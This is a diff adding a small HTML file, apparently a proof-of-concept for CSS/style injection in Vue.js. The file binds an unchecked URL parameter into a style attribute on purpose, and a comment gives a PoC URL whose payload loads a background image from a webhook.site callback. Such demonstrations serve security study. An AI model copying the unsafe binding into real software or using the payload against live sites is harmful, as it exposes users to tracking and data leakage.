@@ -1,0 +1,44 @@
+<html>
+<head>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.5.16/vue.min.js"></script>
+
+</head>
+<body>
+
+	<!--
+		Generate a webhook.site URL to listen for callback. 
+		Observe the callback generated with the PoC.
+	
+		PoC: 
+		./vue-styleinjection.html?style=background-image:url(https://webhook.site/c7dd3b1d-0d53-4815-a09f-19a7d03536fd)
+		
+	-->
+
+	<div id="app">
+		<!-- v-bind style to unsafe user input leads to CSS/Style Injection -->
+		<a :style="userinput">COlouRFuL</a> 
+	</div>
+	
+	<script>
+		var app = new Vue({
+			el: "#app",
+			data: {
+				userinput: "color:red;font-family:consolas"
+			},
+			created() {
+				// getting from URL parameter.
+				let uri = window.location.search.substring(1); 
+				let params = new URLSearchParams(uri);
+				s = params.get("style");
+				
+				if(s){
+					console.log("style: " + s);
+					this.$data.userinput = s;
+				}
+			}
+		})
+	</script>
+	
+</body>
+</html>
